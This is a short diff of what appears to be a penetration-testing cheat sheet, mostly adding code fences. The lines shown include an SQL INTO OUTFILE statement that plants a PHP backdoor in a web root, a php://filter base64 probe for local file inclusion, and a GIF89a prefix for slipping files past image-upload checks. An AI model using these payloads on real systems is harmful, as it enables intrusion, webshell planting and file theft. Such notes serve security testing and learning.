@@ -243,11 +243,16 @@ arp-scan -l -I wlo1
 ```
 ====
 #INTO OUTFILE D00R
+
+```sh
 SELECT “” into outfile “/var/www/WEROOT/backdoor.php”;
+```
 ====
 LFI?
+```sh
 #PHP Filter Checks.
 php://filter/convert.base64-encode/resource=
-====
+###====
 UPLOAD IMAGE?
 GIF89a1
+```
